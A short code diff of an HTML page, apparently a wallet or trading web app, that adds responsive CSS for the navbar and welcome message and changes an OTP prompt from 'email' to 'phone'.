@@ -669,6 +669,20 @@ footer {
     width: 100%;
   }
 }
+
+@media (max-width: 768px) {
+  #welcomeUser {
+    display: block;
+    font-size: 0.9rem;
+    margin-right: auto;
+    padding-right: 0.5rem;
+  }
+  .navbar > div:last-child {
+    flex-direction: column;
+    align-items: flex-end;
+    gap: 0.25rem;
+  }
+}
 </style>
 
 <script>
@@ -753,7 +767,7 @@ function showTradeMessage() {
 <img alt="TrustWallet Logo" src="logo.png" style="width: 100px; height: auto;"/>
 </div>
 <h2>Verify OTP</h2>
-<p style="margin-bottom: 20px;">Enter the 6-digit code sent to your email</p>
+<p style="margin-bottom: 20px;">Enter the 6-digit code sent to your phone</p>
 <form id="otpForm">
 <div class="form-group">
 <label for="otpInput">OTP Code</label>
@@ -1180,6 +1194,20 @@ function initCharts() {
   }
   .left-panel, .right-panel {
     width: 100%;
+  }
+}
+
+@media (max-width: 768px) {
+  #welcomeUser {
+    display: block;
+    font-size: 0.9rem;
+    margin-right: auto;
+    padding-right: 0.5rem;
+  }
+  .navbar > div:last-child {
+    flex-direction: column;
+    align-items: flex-end;
+    gap: 0.25rem;
   }
 }
 </style>
